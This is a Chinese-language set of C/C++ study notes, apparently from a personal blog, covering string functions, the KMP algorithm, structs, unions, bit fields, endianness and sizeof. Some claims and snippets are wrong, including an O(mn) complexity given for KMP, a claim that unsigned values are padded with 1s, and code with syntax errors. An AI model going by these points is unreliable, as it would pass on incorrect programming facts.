基础操作</h3><p><strong>子串</strong>：串种任意个连续字符组成的子序列。字符串本身以及空串也属于字符串的子串。</p><p><strong>子序列</strong>：不要求字符连续，但是顺序与其在主串中相一致。</p><p>以整数格式%d输出字符时，’\0’会输出0，其他字符会输出相应的ascii码的十进制。因此可以以<code>while(*str)</code>来判断是否到达字符串末尾。</p><table><thead><tr><th>strlen(s)</th><th>返回s的长度，以’\0’作为结束标志，但是不包括字符串结束符null</th></tr></thead><tbody><tr><td>strcmp(s1,s2)</td><td>比较两个字符串是否相同。两个字符串自左向右逐个字符比较（ASCII），直到出现不同的字符或遇到’\0’为止。<br>若相等，则返回0；若s1大于s2，则返回正数；若s1小于s2，则返回负数；<br>字符串比较不能用<code>if(s1==s2)</code>，该语句比较的是首地址，而不是内容。</td></tr><tr><td>strcat(s1,s2)</td><td>将字符串s2连接到s1之后，并返回s1。<br>覆盖s1末尾的’\0’，且s1处必须要有足够的空间存放新生成的字符串。</td></tr><tr><td>strcpy(s1,s2)</td><td>将s2复制给s1，并返回s1。复制的内容到’\0’结束，处理不好容易溢出。</td></tr><tr><td>strncat(s1,s2,n)</td><td>将s2的前n个字符连接到s1后面，并返回s1</td></tr><tr><td>strncpy(s1,s2,n)</td><td>将s2的前n个字符复制给s1，并返回s1</td></tr></tbody></table><p>**memcpy(void *dest, void *src, size_t n)**：从源src所指内存地址的起始位置拷贝n个字节到目标dest所指的内存地址的起始位置。必须指定拷贝长度n，且可用于各种数据类型，而strcpy仅用于字符串。</p><p>**memset(void *s,  int ch, size_t n)**：将s中前n个字节用ch替换并返回s，作用是在一段内存中填充某个给定的值，它是对较大的结构体或数组进行清零操作的一种最快方法。</p><h3 id="2-2-字符串包含问题"><a href="#2-2-字符串包含问题" class="headerlink" title="2.2 字符串包含问题"></a>2.2 字符串包含问题</h3><h4 id="串的模式匹配算法KMP"><a href="#串的模式匹配算法KMP" class="headerlink" title="串的模式匹配算法KMP"></a>串的模式匹配算法KMP</h4><ul><li><p><strong>Brute Force算法</strong></p><p><strong>时间复杂度O(mn)</strong></p></li></ul><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-20220616154236.png" alt="image-20220616153841511"></p><ul><li><p><strong>KMP算法</strong></p><p><a href="https://www.bilibili.com/video/BV1AY4y157yL?spm_id_from=333.337.search-card.all.click&amp;vd_source=854e3e80724343215a332be36ec7cf83">https://www.bilibili.com/video/BV1AY4y157yL?spm_id_from=333.337.search-card.all.click&amp;vd_source=854e3e80724343215a332be36ec7cf83</a></p><p><strong>时间复杂度O(mn)</strong></p><p>KMP算法每当一趟匹配过程中出现字符比较不等时，不需回溯主串（主串的指针一直向后移动，不回退），而是利用已经得到的“部分匹配”结果将模式串向右“滑动”尽可能远的一段距离后，继续进行比较，且此时并不一定是拿模式串的第一位继续比较。</p><p><strong>next数组的作用</strong>：当匹配失败时，查看最后一个匹配成功的字符所对应的next数值。下次匹配时，在模式串中跳过前next个字符继续比对</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">kmp_search</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* src, <span class="type">int</span> slen, <span class="type">const</span> <span class="type">char</span>* patn, <span class="type">int</span> plen, <span class="type">const</span> <span class="type">int</span>* nextval, <span class="type">int</span> pos)</span></span>&#123;</span><br><span class="line">    <span class="comment">// nextval数组已知</span></span><br><span class="line">    <span class="type">int</span> i=pos;  <span class="comment">// 主串的指针</span></span><br><span class="line">    <span class="type">int</span> j=<span class="number">0</span>;    <span class="comment">// 子串的指针</span></span><br><span class="line">    <span class="keyword">while</span>(i&lt;slen &amp;&amp; j&lt;plen)&#123;  <span class="comment">// i永远递增</span></span><br><span class="line">        <span class="keyword">if</span>(j==<span class="number">-1</span> || src[i]==patn[j])&#123;++i;++j;&#125;   <span class="comment">// 该字符匹配，指针后移</span></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//匹配失败时直接使用patn[nextval[j]]与s[i]继续比较，即跳过模式串中的nextval[j]个字符</span></span><br><span class="line">            j=nextval[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(j&gt;=plen) <span class="keyword">return</span> i-plen;  <span class="comment">//返回匹配成功的子串开头</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">-1</span>;  <span class="comment">//匹配失败</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面给出计算<strong>nextval</strong>数组的函数：</p><p><strong>思想</strong>：在匹配成功的那段模式串中寻找最长的相同前后缀，这个长度就是nextval。那么对于匹配成功的那部分字符串，模式串的前缀就可以匹配到主串的后缀，所以可以跳过nextval个字符。</p><p>这个最长的相同前后缀不包括匹配成功的部分模式串本身。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_nextval</span><span class="params">(<span class="type">char</span> <span class="type">const</span>* ptrn, <span class="type">int</span> plen, <span class="type">int</span>* nextval)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>; nextval[<span class="number">0</span>]=<span class="number">-1</span>;   <span class="comment">// 第0位前面没有字符串，也无法找最长相同前后缀，所以初始化为-1</span></span><br><span class="line">    <span class="type">int</span> k=<span class="number">-1</span>;  <span class="comment">// K记录字符i之前的字符串中最长相同前后缀的位置，就是next[i]</span></span><br><span class="line">    <span class="keyword">while</span>(i&lt;plen<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="comment">// 判断1：确定最长相同前后缀长度</span></span><br><span class="line">        <span class="keyword">if</span>(k==<span class="number">-1</span> || ptrn[i] == ptrn[k])&#123;  <span class="comment">// 相等时k加1，即在前一位字符的k上加1得到目前的字符的k</span></span><br><span class="line">            ++i;</span><br><span class="line">            ++k;</span><br><span class="line">            <span class="comment">// 判断2：如何给nextval[i]赋值</span></span><br><span class="line">            <span class="keyword">if</span>(ptrn[i] != ptrn[k])     <span class="comment">// i、k位置的字符是否相同，不相同，nextval[i]就等于k，下次与主串继续比较k处的字符，而不是从模式串开头开始</span></span><br><span class="line">                nextval[i]=k;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                nextval[i]=nextval[k]; <span class="comment">// 相同的话，因为i和k处的字符相等，主串接着比较k处的字符依然是不相等的，所以改为继续比较nextval[k]处的字符</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            k=nextval[k]; <span class="comment">//不相等时k回退，直到找到k处的字符与i处相等或者k=-1</span></span><br><span class="line">        <span class="comment">// 改为判断i、nextval[k]位置的字符是否相等，即查看相同前缀的前缀，继续判断（相同前缀的前缀等于相同后缀的后缀），直到k=-1（不存在任何相同的前后缀）</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以模式串<code>char *ptrn = “ABABC&quot;</code>为例，nextval数组下标为0到4。</p><p>对于ptrn[0]来说，不存在更短的前后缀，所以nextval[0]直接为-1；</p><p>接着对于ptrn[1]之前的字符串”A“，此时k&#x3D;-1，所以进入判断1，k和i加1，k&#x3D;0，i&#x3D;1，由于ptrn[1] !&#x3D; ptrn[0]，所以nextval[1]为k，为0；<u>与ptrn[1]的’B’不匹配，而ptrn[0]与ptrn[1]不相等，所以可以右滑到与ptrn[0]的’A’继续匹配；</u></p><p>接着对于ptrn[2]之前的字符串”AB“，此时k&#x3D;0，ptrn[1] !&#x3D; ptrn[0]，所以进入判断1，k回退为nextval[0]，为-1，接着继续判断1，k和i加1，k&#x3D;0（最长相同前后缀的长度），i&#x3D;2，ptrn[2] &#x3D;&#x3D; ptrn[0]，所以nextval[2]为nextval[0]，为-1；<u>与ptrn[2]的’A’不匹配，那右滑到ptrn[0]的’A’也是仍然不匹配的，所以nextval[2]为-1；</u></p><p>对于ptrn[3]之前的字符串”ABA“，此时k&#x3D;0，ptrn[2] &#x3D;&#x3D; ptrn[0]，所以进入判断1，k和i加1，k&#x3D;1（最长相同前后缀的长度），i&#x3D;3，由于ptrn[3] &#x3D;&#x3D; ptrn[1]，nextval[3]为nextval[1]，为0；<u>与ptrn[3]的’B’不匹配，那右滑到ptrn[1]的’B’也是仍然不匹配的，所以nextval[3]为0；</u></p><p>对于ptrn[4]之前的字符串”ABAB“，此时k&#x3D;1，ptrn[3] &#x3D;&#x3D; ptrn[1]，所以进入判断1，k和i加1，k&#x3D;2（最长相同前后缀的长度），i&#x3D;4，ptrn[4] !&#x3D; ptrn[2]，所以nextval[3]为k，为2。<u>与ptrn[4]的’C’不匹配，那右滑到ptrn[2]的’A’继续匹配的；</u></p><h4 id="字符串移位包含问题"><a href="#字符串移位包含问题" class="headerlink" title="字符串移位包含问题"></a>字符串移位包含问题</h4><p>假设有一个函数 isSubstring, 其功能是判断一个字符串是不是另外一个字符串的子串。现在给你两个字符串s1与s2,请仅使用isSubstring函数判断s2是否能够被s1做循环移位得到的字符串包含。<br>解答思想是:<br>如果字符串s1的长度小于s2的长度，则返回0; .<br>否则，连接s1与其自身得到新字符串sls1,然后判断s2是否是sIsl的子串，若是返回1,若不是返回0。</p><hr><h3 id="2-3-字符串转数字"><a href="#2-3-字符串转数字" class="headerlink" title="2.3 字符串转数字"></a>2.3 字符串转数字</h3><p>将字符串的字符逐个转为数字（<code>*digit - &#39;0&#39;</code>），乘以10然后加上下一个字符表示的数字。</p><p>另外还需要考虑特殊字符，比如首字符是否为’+’或者’-‘，是否包含非法字符，最后要以’\0’结束。以及中间结果是否大于上限std: :numeric_ limits&lt;int&gt;: :max()。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220620111637041.png" alt="image-20220620111637041"></p><p>**<u>大数乘法</u>**：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220620142029124.png" alt="image-20220620142029124"></p><hr><h3 id="2-4-其他问题"><a href="#2-4-其他问题" class="headerlink" title="2.4 其他问题"></a>2.4 其他问题</h3><ul><li><p>字符串中的单词逆转：使用指针交换字符</p></li><li><p>在主串中删除模式串中出现的字符：</p><p>遍历；也可以给每个字母分配一个素数，从2开始，以此类推。这样a将会是2, b将会是3, c将会是5,等等，然后得出模式串的乘积multi, 现在遍历字符串s，把每个字母代表的素数除multi, 若能<br>整除，则将其删除。</p></li><li><p>删除字符串开头和末尾的空格，并将中间的连续空格转化为1个</p></li><li><p>在字符串中找到第一个只出现一次的字符：使用数组实现的hash表即可，下标存放ascii码值（char可以直接作为整数处理），元素存放出现次数。在第二次遍历时，取首个为1的元素即可。</p></li><li><p>判断字符串中所有字符都不相同：同样使用hash表即可，值统一为True。若出现一个字符在hash表中存在，则表明该字符重复。</p></li></ul><hr><h2 id="3-结构体、共用体和枚举"><a href="#3-结构体、共用体和枚举" class="headerlink" title="3. 结构体、共用体和枚举"></a>3. 结构体、共用体和枚举</h2><p><strong>与数组的不同</strong>：</p><p>结构体可以在一个结构中声明不同的数据类型；相同结构的结构体变量可以相互赋值。</p><p><strong>与class的不同</strong>：</p><p>class的成员访问权限默认为private，而struct成员的访问权限默认为public。</p><h3 id="3-1-结构体的定义"><a href="#3-1-结构体的定义" class="headerlink" title="3.1 结构体的定义"></a>3.1 结构体的定义</h3><p>不允许结构体本身的递归定义，但可以使用指针指向本类型。</p><p>结构体定义中可以包含另外的结构体，即可以嵌套。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Books</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> title[<span class="number">50</span>];</span><br><span class="line">   <span class="type">char</span> author[<span class="number">50</span>];</span><br><span class="line">   <span class="type">char</span> subject[<span class="number">100</span>];</span><br><span class="line">   <span class="type">int</span> book_id;</span><br><span class="line">   <span class="keyword">struct</span> <span class="title class_">person</span> *per;  <span class="comment">// 指向本类型的指针</span></span><br><span class="line">&#125; book;  <span class="comment">// 同时声明一个结构体Books的变量book</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Books</span> book;   <span class="comment">// 声明一个结构体变量book</span></span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">person</span>&#123;</span><br><span class="line"><span class="type">char</span> name [<span class="number">20</span>];</span><br><span class="line"><span class="type">char</span> sex;</span><br><span class="line">    <span class="built_in">person</span>(<span class="type">char</span> a[<span class="number">20</span>], <span class="type">char</span> b) :<span class="built_in">name</span>(a), <span class="built_in">sex</span>(b)(a)&#123;&#125;   <span class="comment">// 构造函数</span></span><br><span class="line">&#125;boy1=&#123;<span class="string">&quot;zhangbing&quot;</span>,<span class="string">&#x27;M&#x27;</span>&#125;;   <span class="comment">// 结构体变量可以在定义时初始化赋值</span></span><br></pre></td></tr></table></figure><p>在对结构体变量初始化时，应将各成员所赋初值依照结构体类型说明中成员的顺序依次放在一对大括号中，不允许跳过前面的成员给后面的成员赋值，但<strong>可以只给前面若干成员赋初值</strong>，后面未赋初值的成员中，数值型和字符型的数据，系统自动赋值零。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//也可以用typedef创建新类型Simple</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">char</span> b;</span><br><span class="line">    <span class="type">double</span> c; </span><br><span class="line">&#125; Simple;</span><br><span class="line"><span class="comment">//现在可以用Simple作为类型声明新的结构体变量</span></span><br><span class="line">Simple u1, u2[<span class="number">20</span>], *u3;</span><br></pre></td></tr></table></figure><hr><h3 id="3-2-结构体中的位字段"><a href="#3-2-结构体中的位字段" class="headerlink" title="3.2 结构体中的位字段"></a>3.2 结构体中的位字段</h3><p>C&#x2F;C++允许指定占用特定位数的数据成员，声明时，位字段的类型为整型或枚举，然后是冒号和指定位数的数字，如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">reg</span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> a:<span class="number">1</span>;  <span class="comment">// 占1位</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> b:<span class="number">4</span>;  <span class="comment">// 占4位，4bits</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><hr><h3 id="3-3-共用体"><a href="#3-3-共用体" class="headerlink" title="3.3 共用体"></a>3.3 共用体</h3><p>结构体和共用体都是由多个不同的数据类型成员组成，但在任何同一时刻，<strong>共用体中只存放了一个被选中的成员</strong>，而结构体的所有成员都存在。<strong>对于共用体的不同成员赋值，将会对其他成员重写</strong>，原来成员的值就不存在了，而对于结构体的不同成员赋值是互不影响的。</p><p><strong>结构体占用内存，可能超过各成员内存量总和；共用体占用内存为各成员中占用最大者内存。</strong></p><p>共用体的用途之一是当数据项使用两种或更多种格式（但不会同时使用）时，可节省空间。</p><p>union成员<u><strong>从低地址开始存放</strong></u>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Intel X86上运行一下程序</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">union</span>&#123;</span><br><span class="line">        <span class="keyword">struct</span> &#123;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">short</span> s1:<span class="number">3</span>;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">short</span> s2:<span class="number">3</span>;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">short</span> s3:<span class="number">2</span>;</span><br><span class="line">        &#125;x;</span><br><span class="line"><span class="type">char</span> C;</span><br><span class="line">&#125;V;</span><br><span class="line">v.c=<span class="number">103</span>;</span><br><span class="line">cout&lt;&lt;v.x.s1&lt;&lt;endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于Intel X86是小端模式，103转为二进制为01100111，所以高地址到低地址的内存空间为01100111。而union成员都是从低地址开始存放，故分别分配给s1低地址的111，然后是s2的100，最后是s3的高地址的01。</p><hr><h3 id="3-4-大小端存储"><a href="#3-4-大小端存储" class="headerlink" title="3.4 大小端存储"></a>3.4 大小端存储</h3><h4 id="字节序"><a href="#字节序" class="headerlink" title="字节序"></a>字节序</h4><p><strong>大端存储格式</strong>：字数据的高字节存储在低地址中，而字数据的低字节则存放在高地址中；</p><p><strong>小端存储格式</strong>：低地址中存放的是字数据的低字节，高地址存放的是字数据的高字节。</p><p><em><strong><u>注意</u></strong></em>: </p><p>printf 函数是最右侧的元素先入栈。<strong>若入栈元素为char（占1个字节）、short（占2个字节） 等小于4个字节的类型，入栈时也占4个字节</strong>。这里的一个关键点是: char、 short 等类型入栈时由于入栈字节数为4，比它们实际占用的内存数要多，那么高位是补0还是补1呢?当数是<strong>无符号类型时（如unsigned short），高位总是补1</strong>，当数是<strong>有符号类型时（如short），高位补符号位</strong>。</p><p>例题：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220622110310042.png" alt="image-20220622110310042"></p><p>array数组后4个元素默认初始化为0x00。printf的输出从右到左先依次入栈，输出时依次出栈。首先pint为int类型的指针，所以运算时4个字节一个单位，*(pint+2)的值为0x00000000。pint64为long long类型指针，运算时8个字节一个单位，又系统为小端，低位在低地址字节，所以*pint64为0x0807060504030201。pshort为short类型指针，运算时2个字节一个单位，所以*(pshort+2)为0x0605，由于入栈时不足4个字节，所以高位补0，得到0x00000605。这些值依次入栈得到如下栈空间（高位先入栈）：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220622110332959.png" alt="image-20220622110332959"></p><h4 id="位序"><a href="#位序" class="headerlink" title="位序"></a>位序</h4><p>在字节内部也存在大小端问题（对于位字段&#x2F;位数据），相应的大小端定义为：</p><ul><li><p>第一步：将位字段组成的字节，低字节存放在低地址，高字节存放在高地址；</p></li><li><p>第二步：然后按照大小端格式的定义在每个字节中分配位地址：</p></li></ul><p><strong>大端存储格式</strong>：首先将位数据的高位存储在字节的高位中，之后低位数据存放在低位中。</p><p><strong>小端存储格式</strong>：首先将位数据的低位存储在字节的低位中，之后高位数据存放在高位中。</p><p><u><em><strong>注意</strong></em></u>：若位数据（如<code>short in a:9</code>）大于1个字节，则先在位数据组成的字节序中，先按字节序中的大小端的定义分配相应大小的位数据到相应的字节中（此过程位数据可能被拆分到不同字节中），然后再在每个字节中，按位序大小端的定义分配到相应的位地址。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> a:<span class="number">5</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> b:<span class="number">5</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> c:<span class="number">6</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>**)</span></span>&#123;</span><br><span class="line">    Test t;</span><br><span class="line">    t.a=<span class="number">16</span>;</span><br><span class="line">    t.b=<span class="number">4</span>;</span><br><span class="line">    t.c=<span class="number">0</span>;</span><br><span class="line">    <span class="type">short</span> i = *(<span class="type">short</span>*)&amp;t;</span><br><span class="line">    cout&lt;&lt;i;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上述代码中，结构体表示的是由a，b，c三个位字段组成的两个字节，a是高位域员，c是低位域员。</p><p>在大端存储格式中，优先将位数据的高位存储在字节的高位中，所以5位的a（10000）和b的三位高位（001）分配到高位字节，剩下的2位b（00）和6位c（000000）分配到低位字节，因此高位字节的位序为[10000][001]，低位字节位序为[00][000000]；</p><p>在小端存储格式中，优先将位数据的低位存储在字节的低位中，所以5位a（10000）和b的三位低位（100）分配到高位字节，b的两位高位（00）和6位c（000000）分配到低位字节，因此高位字节的位序为[100][10000]，低位字节位序为[000000][00]；</p><p>因此，上述代码中t所在内存为：10010000 00000000，由于时小端存储，所以转换为十六进制为0x0090，所以输出应该为144。</p><hr><h3 id="3-5-枚举"><a href="#3-5-枚举" class="headerlink" title="3.5 枚举"></a>3.5 枚举</h3><p>C++的enum工具提供了另一种创建符号常量的方式，可以用于代替const。语句如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> 枚举类型名&#123;枚举常量<span class="number">1</span>[=整形常数], 枚举常量<span class="number">2</span>[=整形常数], …&#125;[变量名列表]</span><br></pre></td></tr></table></figure><p>花括号的内容称为枚举表，包含多个枚举常量，声明时可以为其赋初值。若不赋初值，编译器会为每一个枚举常量赋一个不同的整型值，第一个为0，第二个为1等。当枚举表中某个常量赋值后，其后的成员则按依次加1的规则确定其值。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span> <span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">enum</span>&#123;a, b=<span class="number">5</span>，c, d=<span class="number">4</span>, e&#125;;    <span class="comment">// a为0,c为6,e为5</span></span><br><span class="line"><span class="keyword">enum</span>&#123;h, x, v=<span class="number">120</span>，w, r=<span class="number">99</span>, s&#125;;  <span class="comment">// h为0,x为1，w为121,s为100</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><hr><h3 id="3-6-sizeof运算符"><a href="#3-6-sizeof运算符" class="headerlink" title="3.6 sizeof运算符"></a>3.6 sizeof运算符</h3><h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><p>sizeof属于运算符，而不是函数。以字节形式给出其操作数的存储大小。操作数可以是一个表达式或括在括号内的类型名。操作数是类型名时必须加括号，比如<code>sizeof(int)</code>。</p><p><strong>sizeof的计算发生在编译时刻</strong>，可以直接作为常量表达式使用，所以其操作数中的运算会被忽略，比如<code>sizeof(a++)</code>，其中的++并不执行。</p><p>实际上，sizeof 计算对象的大小也是转换成对对象类型的计算，也就是说，<strong>同种类型的不同对象其sizeof值都是一致的</strong>。这里，对象可以进一步延伸至表达式，即<strong>sizeof可以对一个表达式求值，编译器根据表达式的最终结果类型来确定大小，一般不会对表达式进行计算</strong>。比如<code>sizeof(2)</code>等价于<code>sizeof(int)</code>，<code>sizeof(2+3.14)</code>等价于<code>sizeof(double)</code>。</p><p>函数、位域成员不能被计算sizeof值。</p><h4 id="使用结果"><a href="#使用结果" class="headerlink" title="使用结果"></a>使用结果</h4><p>sizeof操作符的结果类型是size_ t，它被定义为unsigned int 类型。该类型保证能容纳实现所建立的最大对象的字节大小。</p><table><thead><tr><th>数据类型</th><th>占据字节长度(16bit编译器)</th><th>占据字节长度(32bit编译器)</th><th>占据字节长度(64bit编译器)</th></tr></thead><tbody><tr><td>shortint</td><td>2</td><td>2</td><td>2</td></tr><tr><td>int</td><td>2</td><td>4</td><td>4</td></tr><tr><td>long</td><td>4</td><td>4</td><td>4</td></tr><tr><td>long long</td><td>8</td><td>8</td><td>8</td></tr><tr><td>float</td><td>4</td><td>4</td><td>4</td></tr><tr><td>double</td><td>8</td><td>8</td><td>8</td></tr><tr><td>char</td><td>1</td><td>1</td><td>1</td></tr><tr><td>bool</td><td>1</td><td>1</td><td>1</td></tr><tr><td>指针</td><td>-</td><td>4</td><td>8</td></tr><tr><td>引用</td><td>取决于被引用对象</td><td>取决于被引用对象</td><td>取决于被引用对象</td></tr></tbody></table><p>若有:<code>char ch3[]=&quot;Danie1&quot;;</code>则<code>sizeof(ch3) = sizeof(&quot;Daniel&quot;)=7</code>，而<code>strlen(&quot;Daniel&quot;)=6</code>。</p><p>可见<strong>sizeof计算数据（包括数组、变量、类型、结构体等）所占内存空间，用字节数表示，故将内容为’\0’的数组元素也会计算在内</strong>。而<strong>strlen()计算字符数组的字符数，以’\0’为结束标志，且不将’\0’计算在字符数内</strong>。</p><p><strong>注意：<code>sizeof(&quot;\0&quot;) = 2</code>。</strong></p><p>指针可视为变量类型的一种。在32位机器系统下，所有指针变量的sizeof操作结果均为4，若在64位机器系统下，所有指针变量的sizeof 操作结果为8。</p><p>数组可以使用sizeof计算其大小，等于元素个数*元素类型的sizeof。</p><h4 id="struct的空间计算"><a href="#struct的空间计算" class="headerlink" title="struct的空间计算"></a>struct的空间计算</h4><p>struct的空间计算总体遵循两个原则：</p><ul><li><p>**&#x3D;&#x3D;整体空间是占用空间最大的成员(的类型)所占字节数的整数倍&#x3D;&#x3D;**，但在32位Linux+gcc环境下，若最大成员类型所占字节数超过4，如double是8，则整体空间是4的倍数即可。</p></li><li><p>数据对齐原则：内存按结构体成员的先后顺序排列，&#x3D;&#x3D;<strong>当排到该成员变量时，其前面已摆放的空间大小必须是该成员类型大小的整数倍（当排到子结构体时，其前面已摆放的空间大小必须是该子结构体成员中最大类型大小的整数倍）</strong>&#x3D;&#x3D;，如果不够则补齐，依次向后类推，但在Linux+gcc环境下，若某成员类型所占字节数超过4,如double是8，则前面已摆放的空间大小是4的整数倍即可，不够则补齐。<br>对齐问题使结构体的sizeof变得比较复杂。</p><p><u><strong>&#x3D;&#x3D;<em>注意</em>&#x3D;&#x3D;</strong></u>：<strong>结构体中，数组时按照单个单个变量一个一个进行摆放，而不是视为整体。<u>空结构体的占用空间大小为1</u>。</strong></p></li></ul><h4 id="含位域的结构体的空间计算"><a href="#含位域的结构体的空间计算" class="headerlink" title="含位域的结构体的空间计算"></a>含位域的结构体的空间计算</h4><p>使用位域的主要目的是压缩存储，其大致规则为:</p><ul><li><strong>如果相邻位域字段的类型相同，且其位宽之和小于类型的sizeof大小</strong>，则后面的字段将紧邻前一个字段存储，直到不能容纳为止。<strong>所占字节数以其实际占用字节数为准</strong>，也就是进行压缩。</li><li><strong>如果相邻位域字段的类型相同，但其位宽之和大于类型的sizeof大小</strong>，则后面的字段将从新的存储单元开始，其<strong>偏移量为其类型大小的整数倍</strong>，不进行压缩。</li><li>如果相邻的位域字段的类型不同，则各编译器的具体实现有差异，VC6 采取不压缩方式，Dev-C++与linux+gcc采取压缩方式</li><li>如果位域字段之间穿插着非位域字段，则不进行压缩</li><li>整个结构体的总大小为<strong>最宽基本类型成员大小的整数倍</strong>。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 环境为linux+gcc</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">a</span>&#123;</span><br><span class="line"><span class="type">int</span> f1:<span class="number">3</span>;</span><br><span class="line"><span class="type">char</span> b;</span><br><span class="line"><span class="type">char</span> c;</span><br><span 